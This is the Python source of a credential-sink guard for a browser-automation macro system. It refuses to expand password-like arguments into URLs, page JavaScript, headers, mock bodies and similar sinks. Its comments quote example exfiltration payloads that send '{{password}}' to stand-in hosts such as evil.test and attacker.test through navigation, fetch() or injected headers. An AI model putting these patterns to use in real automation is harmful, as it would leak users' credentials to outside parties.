# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""The portable half of the macro credential-sink guard.

Live replay (``macros.substitution``) and the exported macro CLI both expand
``{{name}}`` placeholders through :func:`expand_actions`, and the exporter
renders this module's source verbatim into every generated script
(:func:`octowright.artifacts.script_export.render_macro_cli`), the way it
renders ``drawn_text``. So it imports only the standard library and every name
it defines is fair game in the script's namespace, and a macro that
``macro_run`` refuses is refused by the script too.

The classifier that decides which arg is a credential is NOT here: it lives in
``macros.privacy`` and the script carries its own rendering of it. Callers pass
it in as *is_credential*.

Replay's alias table lives here too, because the guard has to judge the field
replay will actually use: ``inject_headers`` and ``mock_route`` accept both the
recorder's ``pattern`` and the session's ``url_pattern``, and a guard that read
one while replay installed the other was a bypass.
"""

from __future__ import annotations

import copy
import os
import re
from collections.abc import Callable
from typing import Any
from urllib.parse import urlsplit

from octowright.safety_stop import SafetyStop

# Action fields that either leave the machine or execute code. A credential
# expanded into one of these is exfiltration, not automation:
# ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
# the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
#
# The set is by FIELD NAME, so it has to grow whenever a new action introduces
# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
# ``locator.evaluate``/``target.evaluate``, so
# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
# was an unguarded ``evaluate`` under a different name.
#
# The same gap existed for fields that leave the machine without being a URL.
# ``headers`` (inject_headers, set_extra_http_headers, mock_route) rides every
# matching request, and inject_headers takes an attacker-chosen ``pattern``, so
# ``{"headers": {"X-Leak": "{{password}}"}}`` with ``pattern:
# "https://attacker.test/**"`` delivered the password to that host. mock_route's
# ``body`` is served to the page -- for a script request it is code the page
# runs. An upload's ``paths`` entry becomes the filename the server receives.
# ``set_dialog_policy``'s ``prompt_text`` is ``prompt()``'s return value for
# whichever page next calls it, on any origin, and the policy outlives the step
# and the run: arming it with ``{{password}}`` and then navigating handed the
# password to that page.
# Audited against every action in ``runtime._ACTION_MAP``: the remaining string
# fields (selectors, locator text, ``pattern`` match strings, ``expect_*``
# needles, ``value``/``text`` typed into the page, the screenshot ``path``
# contained under RECORDINGS_DIR) are matched locally or ARE the intended
# destination of a credential -- the typed ones only through the fill-origin
# check; the inputs that have none are `CREDENTIAL_UNCHECKED_INPUT_FIELDS`.
CREDENTIAL_UNSAFE_KEYS = frozenset(
    {"url", "expression", "verify_js", "grabbed_predicate_js", "headers", "body", "paths", "prompt_text"}
)

CREDENTIAL_SINKS_ENV = "OCTOWRIGHT_MACRO_CREDENTIAL_SINKS"
_CREDENTIAL_SINKS_OFF = frozenset({"0", "off", "false", "no", "never", "none", "disabled", "allow"})


def credential_sinks_blocked() -> bool:
    """Whether to refuse a credential-named arg in a navigation/code sink.

    ON by default. Set ``OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`` to a falsey token
    (or ``allow``) for a suite that intentionally puts a token in a URL --
    an API-key query parameter is the legitimate case this would otherwise
    break.
    """
    raw = os.environ.get(CREDENTIAL_SINKS_ENV, "block").strip().lower()
    return raw not in _CREDENTIAL_SINKS_OFF


class CredentialSafetyStop(SafetyStop):
    """A credential check stopped a macro: a verdict on the macro, never a flaky page.

    A macro's ``try`` and ``try_each`` (``octowright.conditional``) re-raise it
    rather than suppressing it or moving on to another branch, so a refusal
    always fails the run and is reported instead of reading as success.
    """


class CredentialRefusal(CredentialSafetyStop, ValueError):
    """A credential step refused before it ran. Still a ``ValueError`` for every existing caller."""


class CredentialInputHalted(CredentialSafetyStop, RuntimeError):
    """A credential step stopped while typing. Still a ``RuntimeError`` for every existing caller."""


# Recorded keys that need renaming to match the method's parameter names.
# mock_route/unmock_route: session/core_interaction_mixin.py's recorder.record()
# writes the field as "pattern" (matching macros/lint.py's required-field name),
# but the session methods' parameter is "url_pattern" — without this rename,
# every recorded mock_route/unmock_route replay raised TypeError: unexpected
# keyword argument 'pattern', dead on arrival since the two sides disagreed
# on the field name.
REPLAY_RENAME_KEYS: dict[str, dict[str, str]] = {
    "drag": {"source": "source_selector", "target": "target_selector"},
    "mock_route": {"pattern": "url_pattern"},
    "unmock_route": {"pattern": "url_pattern"},
    # Same split, same reason: the recorder writes "pattern", the session
    # method's parameter is "url_pattern".
    "inject_headers": {"pattern": "url_pattern"},
    "uninject_headers": {"pattern": "url_pattern"},
}


def canonical_aliases(kind: str, fields: dict[str, Any]) -> dict[str, Any]:
    """*fields* with every recorded spelling renamed to the one replay passes on.

    Two spellings of one field that disagree are refused rather than resolved:
    whichever rule picked a winner, a guard and a dispatcher that each applied
    it separately could disagree, and a formatter or a diff merge that reorders
    keys must not change which pattern is installed.
    """
    renames = REPLAY_RENAME_KEYS.get(kind)
    if not renames:
        return dict(fields)
    for recorded, param in renames.items():
        if recorded in fields and param in fields and fields[recorded] != fields[param]:
            raise ValueError(
                f"{kind} carries both {recorded!r} and {param!r} with different values; "
                f"they are one field, so keep only {param!r}"
            )
    return {renames.get(key, key): value for key, value in fields.items()}


#: Actions whose ``headers`` go only where their ``url_pattern`` matches.
#: ``set_extra_http_headers`` is absent on purpose: it rides every request the
#: page makes, third-party hosts included, so it has no destination to vet.
PATTERN_SCOPED_HEADER_ACTIONS = frozenset({"inject_headers", "mock_route"})
#: The ones whose headers are REQUEST headers, which the pattern scopes only on
#: the first hop of a subresource: Playwright applies a routed header override
#: to every redirect the request starts, so an own-site ``fetch`` answered
#: ``302 -> elsewhere`` carries the header elsewhere (measured: chromium and
#: firefox for every header name, webkit for all but ``Authorization``). A
#: session matches its NAVIGATIONS per hop (``ssrf_guard``), but fetch/XHR and
#: an exported script's routes do not. A credential in one needs
#: `FORWARD_ON_REDIRECT_KEY` too. ``mock_route``'s are response headers.
REDIRECT_FORWARDED_HEADER_ACTIONS = frozenset({"inject_headers"})
#: ``{"Authorization": true}`` on such a step: per header, the macro author
#: accepting that the own site may redirect that header onward. A literal
#: bool only, never coerced -- ``"false"`` reading as true is the failure this
#: kind of flag invites. An input to the guard, never to the call.
FORWARD_ON_REDIRECT_KEY = "forward_on_redirect"

#: An origin as the guard compares it: scheme, normalized host, effective port.
Origin = tuple[str, str, int]

_DEFAULT_PORTS = {"http": 80, "https": 443}


def url_origin(url: object) -> Origin | None:
    """The origin of *url*, or None for anything that is not an http(s) URL with a host.

    The host is lowercased and loses a trailing dot; a missing port becomes the
    scheme's default, so ``https://app.test`` and ``https://app.test:443`` are
    one origin while ``http://localhost:3000`` and ``http://localhost:45678``
    are two. Comparing hostnames alone let a macro exempt a header for
    whichever local process listened on another port.
    """
    if not isinstance(url, str) or not url:
        return None
    try:
        parts = urlsplit(url.strip())
        port = parts.port
    except ValueError:
        return None
    scheme = parts.scheme.lower()
    host = (parts.hostname or "").lower().rstrip(".")
    if scheme not in _DEFAULT_PORTS or not host:
        return None
    return scheme, host, port if port is not None else _DEFAULT_PORTS[scheme]


def format_origin(origin: Origin) -> str:
    scheme, host, port = origin
    shown = f"[{host}]" if ":" in host else host
    return f"{scheme}://{shown}" if port == _DEFAULT_PORTS.get(scheme) else f"{scheme}://{shown}:{port}"


#: A pattern names one origin only when its scheme and host are spelled out: no
#: wildcard, no placeholder, no userinfo, no backslash. ``https://*.example.test/**``
#: and ``https://{{host}}/**`` choose the host at match or run time,
#: ``https://app.test@attacker.test/`` is attacker.test to a URL parser, and
#: ``**/api/**`` names no origin at all. A port is optional and, when absent, is
#: the scheme's default -- which is also what the pattern matches in a browser.
_LITERAL_PATTERN_ORIGIN = re.compile(r"^(https?://[^/?#*{}\[\]@\\\s]+)(?:/|$)", re.IGNORECASE)


def pattern_origin(pattern: object) -> Origin | None:
    match = _LITERAL_PATTERN_ORIGIN.match(pattern) if isinstance(pattern, str) else None
    return url_origin(match.group(1)) if match is not None else None


def parse_forward_on_redirect(action: dict[str, Any]) -> frozenset[str]:
    """The header names, casefolded, a step's `FORWARD_ON_REDIRECT_KEY` opts in.

    Refused, not read leniently: a value that is not a literal ``true`` or
    ``false``, or a name the step's ``headers`` does not carry (a typo would
    otherwise opt nothing in and read as if it had)."""
    value = action.get(FORWARD_ON_REDIRECT_KEY)
    if value is None:
        return frozenset()
    shape = f'{FORWARD_ON_REDIRECT_KEY} must map a header name to true or false, such as {{"Authorization": true}}'
    if not isinstance(value, dict):
        raise CredentialRefusal(f"{shape}; got {type(value).__name__}")
    headers = action.get("headers")
    sent = {str(name).strip().casefold() for name in headers} if isinstance(headers, dict) else set()
    chosen: set[str] = set()
    for name, flag in value.items():
        if not isinstance(flag, bool):
            raise CredentialRefusal(f"{shape}; {str(name)[:80]!r} maps to {type(flag).__name__}")
        folded = str(name).strip().casefold()
        if folded not in sent:
            raise CredentialRefusal(
                f"{FORWARD_ON_REDIRECT_KEY} names {str(name)[:80]!r}, which this step's headers do not carry"
            )
        if flag:
            chosen.add(folded)
    return frozenset(chosen)


def redirect_exposed_credential_headers(
    action: dict[str, Any], headers: dict[str, Any], is_credential_header: Callable[[str], bool]
) -> list[str]:
    """The credential-named *headers* a step's `FORWARD_ON_REDIRECT_KEY` does not opt in, sorted.

    What an exported script's ``inject_headers`` refuses, since its plain route
    lets a navigation redirect carry them, and what ``macro_lint`` warns about.
    *is_credential_header* is ``http_headers.is_credential_header``, passed in
    because this module imports only the standard library. Raises as
    `parse_forward_on_redirect` does on a malformed opt-in.
    """
    opted_in = parse_forward_on_redirect(action)
    return sorted(
        str(name)
        for name in headers
        if is_credential_header(str(name)) and str(name).strip().casefold() not in opted_in
    )


def _redirect_refusal(key: str, header: str) -> CredentialRefusal:
    return CredentialRefusal(
        f"macro expands credential arg {{{{{key}}}}} into inject_headers header {header!r} for the session's "
        "own origin, but the pattern scopes only the first request of a fetch/XHR: a redirect from that origin "
        f'carries the header wherever it points. If the site will not redirect it elsewhere, add "{FORWARD_ON_REDIRECT_KEY}": '
        f'{{"{header}": true}} to this step, or set {CREDENTIAL_SINKS_ENV}=allow.'
    )


def headers_reach_trusted_origin(action: dict[str, Any], trusted_origins: frozenset[Origin] | set[Origin]) -> bool:
    """Whether *action*'s headers go only to one of *trusted_origins*.

    *action* must already be alias-canonical, so the pattern read here is the
    one replay installs.
    """
    if not trusted_origins or action.get("action") not in PATTERN_SCOPED_HEADER_ACTIONS:
        return False
    origin = pattern_origin(action.get("url_pattern"))
    return origin is not None and origin in trusted_origins


#: The field each typing action puts into the page. The sink guard lets a
#: credential through here -- it is the intended destination -- so what is
#: checked instead is WHICH page it lands in (`offsite_credential_origin`).
CREDENTIAL_FILL_FIELDS = {"fill": "value", "fill_by": "value", "type": "text"}
#: Fields that put a value into the page with NO delivery-bound origin check.
#: A key press goes to whatever document has focus -- a cross-origin iframe
#: included -- and a selection to whichever frame the selector resolves in, so
#: the pre-dispatch read of the active frame's URL cannot vouch for either. A
#: credential is refused there outright: ``type`` keys one in under the check.
CREDENTIAL_UNCHECKED_INPUT_FIELDS: dict[str, tuple[str, ...]] = {
    "press_key": ("key",),
    "select_option": ("value", "label"),
    "a11y_dragdrop": ("nav_key", "nav_key_sequence", "grab_key", "drop_key", "release_key"),
}
#: A step's own list of extra origins it may type a credential into, for a
#: sign-in hop to an identity provider. An input to the guard, never to the call.
ALLOWED_ORIGINS_KEY = "allowed_origins"
#: Set by `expand_actions` on a typing step whose value came from a
#: credential-tier arg: the names, never the values. Whatever the macro itself
#: put under this key is discarded first, so a macro cannot unmark a step.
CREDENTIAL_FILL_MARKER = "_octowright_credential_args"
CREDENTIAL_FILL_ORIGINS_ENV = "OCTOWRIGHT_MACRO_CREDENTIAL_FILL_ORIGINS"
#: Set by `expand_actions` on a ``macro_call`` whose ``args`` a credential-tier
#: arg was substituted into: the CALLEE's arg names it reached. The callee is
#: expanded with those names credential-tier whatever they are called there
#: (`expand_actions`' *credential_args*), because classifying by the callee's
#: own parameter names let a caller launder ``{{password}}`` as ``{{url}}``.
#: Discarded from the macro first, like `CREDENTIAL_FILL_MARKER`.
CREDENTIAL_CALL_MARKER = "_octowright_credential_call_args"

_EXACT_ORIGIN = re.compile(r"^https?://[^/?#*{}\[\]@\\\s]+/?$", re.IGNORECASE)


def credential_fill_mode() -> str:
    """``block`` (the default) or ``warn``. Anything else is ``block``: this fails closed."""
    raw = os.environ.get(CREDENTIAL_FILL_ORIGINS_ENV, "block").strip().lower()
    return "warn" if raw == "warn" else "block"


def parse_allowed_origins(value: object) -> frozenset[Origin]:
    """A step's ``allowed_origins``, each an exact origin written literally.

    No wildcard, path or ``{{placeholder}}``: a placeholder would let the
    caller's arguments, rather than the macro's author, choose where a
    credential may be typed, and a pattern is a promise about more hosts than
    anyone reviewed.
    """
    if value is None:
        return frozenset()
    if not isinstance(value, list):
        raise CredentialRefusal(
            f"{ALLOWED_ORIGINS_KEY} must be a list of origins such as ['https://login.example'], "
            f"got {type(value).__name__}"
        )
    origins: set[Origin] = set()
    for entry in value:
        origin = url_origin(entry) if isinstance(entry, str) and _EXACT_ORIGIN.match(entry) else None
        if origin is None:
            raise CredentialRefusal(
                f"{ALLOWED_ORIGINS_KEY} entry {str(entry)[:120]!r} is not an exact origin; write it "
                "literally as scheme://host[:port], with no wildcard, path or {{placeholder}}"
            )
        origins.add(origin)
    return frozenset(origins)


def offsite_credential_origin(
    action: dict[str, Any], current_url: object, trusted_origins: frozenset[Origin] | set[Origin]
) -> str | None:
    """The origin a credential-typing *action* would land on, when that is not allowed.

    None means the step may run: it types no credential, the credential checks
    are off, or the page's origin is trusted or listed on the step. Only the
    origin is ever returned, never the page's path or query.
    """
    if not action.get(CREDENTIAL_FILL_MARKER) or not credential_sinks_blocked():
        return None
    origin = url_origin(current_url)
    if origin is not None and origin in set(trusted_origins) | parse_allowed_origins(action.get(ALLOWED_ORIGINS_KEY)):
        return None
    if origin is not None:
        return format_origin(origin)
    try:
        scheme = urlsplit(str(current_url or "")).scheme
    except ValueError:
        scheme = ""
    return f"{scheme}:" if scheme else "<no page>"


def credential_fill_refusal(action: dict[str, Any], shown: str) -> CredentialRefusal:
    names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
    return CredentialRefusal(
        f"macro {action.get('action')} would type credential arg {names} into a page at {shown}, "
        "which is not the session's own origin (its launch URL or persona base_url). For an "
        f'intended sign-in hop, list the origin literally on this step: "{ALLOWED_ORIGINS_KEY}": ["{shown}"]. '
        f"{CREDENTIAL_FILL_ORIGINS_ENV}=warn logs and runs the step instead; "
        f"{CREDENTIAL_SINKS_ENV}=allow turns every credential check off."
    )


def credential_input_stopped(action: dict[str, Any], reason: str, *, started: bool = True) -> CredentialInputHalted:
    """A credential step that stopped, naming the step and why -- never the value, nor how much was typed.

    ``started`` is ``CredentialInputStopped.started``: a step stopped before
    anything went to the page says so, rather than that it stopped partway.
    """
    names = ", ".join("{{" + str(name) + "}}" for name in action.get(CREDENTIAL_FILL_MARKER) or ())
    if not started:
        return CredentialInputHalted(
            f"macro {action.get('action')} did not start typing credential arg {names}: {reason}. "
            "Nothing was typed; re-run the step once the page has settled."
        )
    return CredentialInputHalted(
        f"macro {action.get('action')} stopped typing credential arg {names}: {reason}. "
        "The rest of the value was not typed; re-run the step once the page has settled."
    )


def dispatch_fields(action: dict[str, Any]) -> dict[str, Any]:
    """*action* without the guard's own inputs, which no session method takes."""
    guard_only = {CREDENTIAL_FILL_MARKER, CREDENTIAL_CALL_MARKER}
    if action.get("action") in CREDENTIAL_FILL_FIELDS:
        guard_only.add(ALLOWED_ORIGINS_KEY)
    if action.get("action") in REDIRECT_FORWARDED_HEADER_ACTIONS:
        guard_only.add(FORWARD_ON_REDIRECT_KEY)
    return {key: value for key, value in action.items() if key not in guard_only}


#: Fields whose value runs as JavaScript in the page: ``evaluate``,
#: ``expect_js`` and ``wait_for``'s ``expression``, and ``a11y_dragdrop``'s
#: predicates. A ``mock_route`` ``body`` joins them (`page_code_field`): the
#: page runs it when it answers a script or document request.
PAGE_CODE_KEYS = ("expression", "verify_js", "grabbed_predicate_js")


def page_code_field(action: dict[str, Any]) -> str | None:
    """The field through which *action* runs code in the page, or None."""
    for key in PAGE_CODE_KEYS:
        if action.get(key):
            return key
    if action.get("action") == "mock_route" and action.get("body"):
        return "body"
    return None


def credential_args_in(
    actions: Any,
    *,
    is_credential: Callable[[str], bool],
    placeholder: re.Pattern[str] | str,
    credential_args: frozenset[str] = frozenset(),
) -> list[str]:
    """The credential-tier args *actions*, as written, expand anywhere, by name.

    Any field and any depth -- a nested body, a ``macro_call``'s ``args`` --
    since wherever a credential goes, the page can come to hold it.
    """
    compiled = re.compile(placeholder) if isinstance(placeholder, str) else placeholder
    names: set[str] = set()
    stack: list[Any] = [actions]
    while stack:
        item = stack.pop()
        if isinstance(item, str):
            names.update(compiled.findall(item))
        elif isinstance(item, dict):
            stack.extend(item.values())
        elif isinstance(item, list):
            stack.extend(item)
    return sorted(name for name in names if name in credential_args or is_credential(name))


def page_code_refusal(
    action: dict[str, Any], credential_names: list[str] | tuple[str, ...]
) -> CredentialRefusal | None:
    """Why *action* may not run in a run that expands *credential_names*, or None.

    The sink guard judges only fields a credential placeholder expands into,
    and the fill check only where the value lands. Page code needs neither: a
    constant ``evaluate`` that installs an ``input`` listener before a
    credential fill on the session's own origin -- or reads the field back
    after it -- sends the value wherever it likes. So in a run that carries a
    credential, page code is refused before or after the fill alike. Names
    the step's field and the args, never a value.
    """
    if not credential_names or not credential_sinks_blocked():
        return None
    field = page_code_field(action)
    if field is None:
        return None
    names = ", ".join("{{" + str(name) + "}}" for name in credential_names)
    return CredentialRefusal(
        f"macro {action.get('action')} runs page code ({field}) in a run that types credential arg {names}; "
        "page code can read a typed credential back and send it anywhere. Run it in a macro that carries "
        f"no credential, or set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
    )


def _reached_values(item: dict[str, Any]) -> list[Any]:
    """The containers of *item* a run reaches whenever it reaches *item*.

    An ``if_selector``'s ``then``/``else`` and a ``try_each``'s later branches
    run only when the page decides so; a ``try``'s steps and a ``try_each``'s
    first branch always start. Everything else is walked, as any nesting was.
    """
    kind = item.get("action")
    reached: list[Any] = []
    for key, value in item.items():
        if not isinstance(value, (dict, list)):
            continue
        if kind == "if_selector" and key in ("then", "else"):
            continue
        if kind == "try_each" and key == "branches" and isinstance(value, list):
            value = value[:1]
        reached.append(value)
    return reached


def refuse_page_code(actions: Any, credential_names: list[str] | tuple[str, ...]) -> None:
    """Raise `page_code_refusal` for the first page-code step every run of *actions* reaches.

    Before any step runs, so a refusal leaves nothing half done. A step in a
    conditional branch is judged when the branch is taken instead: replay and
    the exported script both run `page_code_refusal` on every step they
    dispatch, so refusing it here would refuse runs that never execute it.
    """
    stack: list[Any] = [actions]
    while stack:
        item = stack.pop(0)
        if isinstance(item, list):
            stack[:0] = item
        elif isinstance(item, dict):
            if isinstance(item.get("action"), str) and (refusal := page_code_refusal(item, credential_names)):
                raise refusal
            stack.extend(_reached_values(item))


def _sink_refusal(key: str) -> CredentialRefusal:
    return CredentialRefusal(
        f"macro expands credential arg {{{{{key}}}}} into a navigation or code sink; "
        "this would send the secret off-machine. A header may carry one through "
        "inject_headers whose pattern spells out the session's own origin -- scheme, host "
        f"and port of its launch URL or persona base_url -- with {FORWARD_ON_REDIRECT_KEY} set for that header. "
        f"Set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
    )


class _Expander:
    def __init__(
        self,
        args: dict[str, Any],
        *,
        is_credential: Callable[[str], bool],
        placeholder: re.Pattern[str],
        trusted_origins: frozenset[Origin] | set[Origin],
        credential_args: frozenset[str] = frozenset(),
    ) -> None:
        self.args = args
        # A name the caller's credential reached is credential-tier here too,
        # whatever it is called (`CREDENTIAL_CALL_MARKER`).
        self.is_credential = (
            (lambda key: key in credential_args or is_credential(key)) if credential_args else is_credential
        )
        self.placeholder = placeholder
        self.trusted_origins = trusted_origins
        self.blocked = credential_sinks_blocked()

    def text(self, value: str, *, unsafe_sink: bool) -> str:
        def replacer(match: re.Match[str]) -> str:
            key = match.group(1)
            if key not in self.args:
                raise KeyError(f"placeholder {{{{{key}}}}} has no matching arg; available: {list(self.args)}")
            if unsafe_sink and self.blocked and self.is_credential(key):
                raise _sink_refusal(key)
            return str(self.args[key])

        return self.placeholder.sub(replacer, value)

    def action_name(self, written: Any) -> Any:
        """The action a step will dispatch as: its ``action`` field, expanded.

        Resolved before anything else about the step is judged. Classifying
        the name as written made ``{"action": "{{kind}}", "value":
        "{{password}}"}`` an unknown action -- no credential marker, so no
        origin check -- that then dispatched as a ``fill``; a ``{{call}}``
        resolving to ``macro_call`` lost its taint the same way. A
        credential-tier arg is refused as a name whatever the sink setting:
        it has no use there, and an unknown-action error would carry it.
        """
        if not isinstance(written, str):
            return written
        for key in self.placeholder.findall(written):
            if self.is_credential(key):
                raise CredentialRefusal(
                    f"macro uses credential arg {{{{{key}}}}} as an action name; an action name must "
                    "be written literally or come from a non-credential arg"
                )
        return self.text(written, unsafe_sink=False)

    def action(self, node: dict[str, Any]) -> dict[str, Any]:
        resolved = self.action_name(node.get("action"))
        kind = str(resolved)
        node = canonical_aliases(kind, {**node, "action": resolved})
        node.pop(CREDENTIAL_FILL_MARKER, None)
        node.pop(CREDENTIAL_CALL_MARKER, None)
        self._refuse_unchecked_input(kind, node)
        credentials = self._typed_credentials(kind, node)
        tainted = self._tainted_call_args(node) if kind == "macro_call" else []
        own_site = headers_reach_trusted_origin(node, self.trusted_origins)
        forwarded = kind in REDIRECT_FORWARDED_HEADER_ACTIONS
        opted_in = parse_forward_on_redirect(node) if forwarded else frozenset()
        expanded = {
            key: item if key == "action" else self._field(key, item, own_site=own_site, opted_in=opted_in, kind=kind)
            for key, item in node.items()
        }
        if credentials:
            expanded[CREDENTIAL_FILL_MARKER] = credentials
        if tainted:
            expanded[CREDENTIAL_CALL_MARKER] = tainted
        return expanded

    def _field(self, key: str, item: Any, *, own_site: bool, opted_in: frozenset[str], kind: str) -> Any:
        """One field of a step, expanded under the sink rule that applies to it."""
        if key != "headers" or not own_site:
            return self.value(item, unsafe_sink=key in CREDENTIAL_UNSAFE_KEYS)
        if kind not in REDIRECT_FORWARDED_HEADER_ACTIONS:
            return self.value(item, unsafe_sink=False)  # a response served to the page
        if not isinstance(item, dict):
            return self.value(item, unsafe_sink=True)
        return self._headers(item, opted_in)

    def _headers(self, headers: dict[str, Any], opted_in: frozenset[str]) -> dict[str, Any]:
        """Own-site request headers: each exempt only if its name is opted in."""
        expanded: dict[str, Any] = {}
        for name, item in headers.items():
            if str(name).strip().casefold() in opted_in:
                expanded[name] = self.value(item, unsafe_sink=False)
                continue
            try:
                expanded[name] = self.value(item, unsafe_sink=True)
            except CredentialRefusal:
                # Only the opt-in is missing: say so rather than "off-machine".
                key = next((k for k in self.placeholder.findall(str(item)) if self.is_credential(k)), "?")
                raise _redirect_refusal(key, str(name)) from None
        return expanded

    def _mentions_credential(self, value: Any) -> bool:
        if isinstance(value, str):
            return any(self.is_credential(name) for name in self.placeholder.findall(value))
        if isinstance(value, dict):
            return any(self._mentions_credential(item) for item in value.values())
        if isinstance(value, list):
            return any(self._mentions_credential(item) for item in value)
        return False

    def _tainted_call_args(self, node: dict[str, Any]) -> list[str]:
        """The callee arg names a credential-tier arg is substituted into, anywhere in the value."""
        call_args = node.get("args")
        if not isinstance(call_args, dict):
            return []
        return sorted(str(key) for key, value in call_args.items() if self._mentions_credential(value))

    def _refuse_unchecked_input(self, kind: str, node: dict[str, Any]) -> None:
        """Refuse a credential-tier arg in a field `CREDENTIAL_UNCHECKED_INPUT_FIELDS` names."""
        if not self.blocked:
            return
        for field_name in CREDENTIAL_UNCHECKED_INPUT_FIELDS.get(kind, ()):
            names = self._credential_names(node.get(field_name))
            if names:
                shown = ", ".join("{{" + name + "}}" for name in names)
                raise CredentialRefusal(
                    f"macro {kind} puts credential arg {shown} into the page through {field_name!r}, "
                    "where nothing checks which origin receives it. Key a credential in with a type or "
                    f"fill step, which do; set {CREDENTIAL_SINKS_ENV}=allow if that is intended."
                )

    def _credential_names(self, value: Any) -> list[str]:
        if isinstance(value, str):
            return sorted({name for name in self.placeholder.findall(value) if self.is_credential(name)})
        if isinstance(value, list):
            return sorted({name for item in value for name in self._credential_names(item)})
        return []

    def _typed_credentials(self, kind: str, node: dict[str, Any]) -> list[str]:
        """The credential-tier args a typing step puts into the page, by name."""
        typed_field = CREDENTIAL_FILL_FIELDS.get(kind)
        if typed_field is None:
            return []
        # Judged on the macro as written, before expansion, so the list is the
        # author's and not something an argument spelled into it.
        parse_allowed_origins(node.get(ALLOWED_ORIGINS_KEY))
        typed = node.get(typed_field)
        names = self.placeholder.findall(typed) if isinstance(typed, str) else []
        return sorted({name for name in names if self.is_credential(name)})

    def value(self, value: Any, *, unsafe_sink: bool = False) -> Any:
        if isinstance(value, str):
            return self.text(value, unsafe_sink=unsafe_sink)
        if isinstance(value, dict):
            # A nested action (a try/if_selector body) is judged as an action;
            # a dict inside a sink inherits the sink so a value cannot be
            # laundered through a container.
            if not unsafe_sink and isinstance(value.get("action"), str):
                return self.action(value)
            return {
                key: self.value(item, unsafe_sink=unsafe_sink or key in CREDENTIAL_UNSAFE_KEYS)
                for key, item in value.items()
            }
        if isinstance(value, list):
            return [self.value(item, unsafe_sink=unsafe_sink) for item in value]
        return value


def expand_actions(
    actions: list[dict[str, Any]],
    args: dict[str, Any],
    *,
    is_credential: Callable[[str], bool],
    placeholder: re.Pattern[str] | str,
    trusted_origins: frozenset[Origin] | set[Origin] = frozenset(),
    credential_args: frozenset[str] = frozenset(),
) -> list[dict[str, Any]]:
    """Expand ``{{name}}`` placeholders, refusing a credential in a sink.

    Every action comes back alias-canonical (see `canonical_aliases`), so the
    guard and the dispatcher read the same field. *trusted_origins* is the one
    exemption: a credential in the ``headers`` of an action whose pattern names
    one of them, scheme, host and port. *credential_args* are names that are
    credential-tier whatever *is_credential* says: a called macro's args that
    its caller's credential reached (`CREDENTIAL_CALL_MARKER`).
    """
    compiled = re.compile(placeholder) if isinstance(placeholder, str) else placeholder
    expander = _Expander(
        args,
        is_credential=is_credential,
        placeholder=compiled,
        trusted_origins=trusted_origins,
        credential_args=credential_args,
    )
    return [expander.value(copy.deepcopy(action)) for action in actions]
